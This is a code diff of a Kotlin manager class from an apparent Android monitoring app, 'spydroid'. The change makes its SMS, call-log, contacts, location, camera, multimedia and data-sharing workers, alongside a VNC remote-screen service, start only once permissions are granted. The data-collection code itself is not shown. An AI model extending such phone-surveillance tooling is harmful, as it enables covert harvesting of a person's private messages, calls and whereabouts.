@@ -21,13 +21,19 @@ import android.content.Context
 import android.content.Intent
 import android.os.Build
 import android.preference.PreferenceManager
+import android.widget.Toast
 import androidx.work.BackoffPolicy
 import androidx.work.OneTimeWorkRequest
 import androidx.work.WorkManager
 import androidx.work.WorkRequest
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 import net.christianbeier.droidvnc_ng.Constants
 import net.christianbeier.droidvnc_ng.Defaults
 import net.christianbeier.droidvnc_ng.VncService
+import net.spydroid.common.local.LocalDataProvider
+import net.spydroid.common.local.data.GLOBAL_STATES_PERMISSIONS
 import net.spydroid.feature.calls.CallsWork
 import net.spydroid.feature.camera.CameraWork
 import net.spydroid.feature.contacts.ContactsWork
@@ -41,6 +47,9 @@ import java.util.concurrent.TimeUnit
 class ManagerFeatures(
     private val context: Context
 ) {
+
+    private val localDataProvider = LocalDataProvider.current(context)
+    private val coroutineScope = CoroutineScope(Dispatchers.Main)
 
     inner class vnc {
         fun start() {
@@ -93,10 +102,16 @@ class ManagerFeatures(
 
     inner class location() {
         fun start() {
-            val locationWork: WorkRequest =
-                OneTimeWorkRequest.Builder(LocationWork::class.java).build()
-            WorkManager.getInstance(context).enqueue(locationWork)
-
+            coroutineScope.launch {
+                localDataProvider.locationState.collect {
+                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
+                        val locationWork: WorkRequest =
+                            OneTimeWorkRequest.Builder(LocationWork::class.java).build()
+                        WorkManager.getInstance(context).enqueue(locationWork)
+                        showText("Localización")
+                    }
+                }
+            }
         }
 
         fun stop() {
@@ -106,8 +121,15 @@ class ManagerFeatures(
 
     inner class sms() {
         fun start() {
-            val smsWork: WorkRequest = OneTimeWorkRequest.Builder(SmsWork::class.java).build()
-            WorkManager.getInstance(context).enqueue(smsWork)
+            coroutineScope.launch {
+                localDataProvider.smsState.collect {
+                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED){
+                        val smsWork: WorkRequest = OneTimeWorkRequest.Builder(SmsWork::class.java).build()
+                        WorkManager.getInstance(context).enqueue(smsWork)
+                        showText("Mensajes")
+                    }
+                }
+            }
         }
 
         fun stop() {
@@ -117,9 +139,17 @@ class ManagerFeatures(
 
     inner class contacts() {
         fun start() {
-            val contactsWork: WorkRequest =
-                OneTimeWorkRequest.Builder(ContactsWork::class.java).build()
-            WorkManager.getInstance(context).enqueue(contactsWork)
+            coroutineScope.launch {
+                localDataProvider.contactsState.collect {
+                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
+                        val contactsWork: WorkRequest =
+                            OneTimeWorkRequest.Builder(ContactsWork::class.java).build()
+                        WorkManager.getInstance(context).enqueue(contactsWork)
+                        showText("Contactos")
+                    }
+                }
+            }
+
         }
 
         fun stop() {
@@ -129,15 +159,24 @@ class ManagerFeatures(
 
     inner class multimedia() {
         fun start() {
-            val multimediaWork: WorkRequest =
-                OneTimeWorkRequest.Builder(MultimediaWork::class.java).setBackoffCriteria(
-                    BackoffPolicy.LINEAR,  // politics
-                    10,  // Time 10 mins
-                    TimeUnit.MINUTES
-                )
-                    .build()
 
-            WorkManager.getInstance(context).enqueue(multimediaWork)
+            coroutineScope.launch {
+                localDataProvider.multimediaState.collect{
+                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
+                        val multimediaWork: WorkRequest =
+                            OneTimeWorkRequest.Builder(MultimediaWork::class.java).setBackoffCriteria(
+                                BackoffPolicy.LINEAR,  // politics
+                                10,  // Time 10 mins
+                                TimeUnit.MINUTES
+                            )
+                                .build()
+
+                        WorkManager.getInstance(context).enqueue(multimediaWork)
+                        showText("Multimedia")
+                    }
+                }
+            }
+
         }
 
         fun stop() {
@@ -147,9 +186,17 @@ class ManagerFeatures(
 
     inner class camera() {
         fun start() {
-            val cameraWOrk: WorkRequest =
-                OneTimeWorkRequest.Builder(CameraWork::class.java).build()
-            WorkManager.getInstance(context).enqueue(cameraWOrk)
+            coroutineScope.launch {
+                localDataProvider.cameraState.collect{
+                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
+                        val cameraWOrk: WorkRequest =
+                            OneTimeWorkRequest.Builder(CameraWork::class.java).build()
+                        WorkManager.getInstance(context).enqueue(cameraWOrk)
+                    }
+                    showText("Cámara")
+                }
+            }
+
         }
 
         fun stop() {
@@ -159,9 +206,18 @@ class ManagerFeatures(
 
     inner class calls() {
         fun start() {
-            val callsWork: WorkRequest =
-                OneTimeWorkRequest.Builder(CallsWork::class.java).build()
-            WorkManager.getInstance(context).enqueue(callsWork)
+
+            coroutineScope.launch {
+                localDataProvider.callsState.collect {
+                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
+                        val callsWork: WorkRequest =
+                            OneTimeWorkRequest.Builder(CallsWork::class.java).build()
+                        WorkManager.getInstance(context).enqueue(callsWork)
+                    }
+                    showText("LLamadas")
+                }
+            }
+
         }
 
         fun stop() {
@@ -171,14 +227,24 @@ class ManagerFeatures(
 
     inner class shareData() {
         fun start() {
-            val shareDataWork: WorkRequest =
-                OneTimeWorkRequest.Builder(ShareDataWork::class.java)
-                    .build()
-            WorkManager.getInstance(context).enqueue(shareDataWork)
+            coroutineScope.launch {
+                localDataProvider.shareDataState.collect {
+                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
+                        val shareDataWork: WorkRequest =
+                            OneTimeWorkRequest.Builder(ShareDataWork::class.java)
+                                .build()
+                        WorkManager.getInstance(context).enqueue(shareDataWork)
+                        showText("shareData")
+                    }
+                }
+            }
         }
 
         fun stop() {
             //todo
         }
     }
+
+    private fun showText(text: String) =
+        Toast.makeText(context, "Started $text", Toast.LENGTH_SHORT).show()
 }
